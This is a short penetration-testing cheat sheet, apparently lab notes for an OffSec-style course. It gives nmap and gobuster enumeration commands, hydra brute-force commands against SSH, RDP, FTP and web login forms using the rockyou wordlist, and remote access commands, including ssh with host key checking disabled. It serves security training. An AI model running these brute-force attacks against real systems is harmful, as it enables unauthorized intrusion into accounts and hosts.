# Enumeration
```
nmap -sC -sV <ip>
autorecon.py 

# web
autorecon.py
gobuster dir -u http://<ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
	-x txt,pdf
```

# Initial Access
Brute Forcing
```
#SSH
sudo hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.220.201

#RDP
sudo hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.220.202
sudo hydra -l nadine -P /usr/share/wordlists/rockyou.txt rdp://192.168.220.227

#FTP 
hydra -l itadmin -P /usr/share/wordlists/rockyou.txt ftp://192.168.220.202 -V

# Brute Force Web Login
sudo hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.220.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
# HTTP GET request
sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 80 -f 192.168.220.201 http-get
```
# Priv Esc

# Access
ssh
```
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" learner@192.168.50.52
```
rdp
```
xfreerdp +clipboard /u:offsec /v:192.168.189.196
```
ssh private
```
chmod 600 id_rsa
ssh -i id_rsa yeet@192.168.X.X -p 2222

alfred
```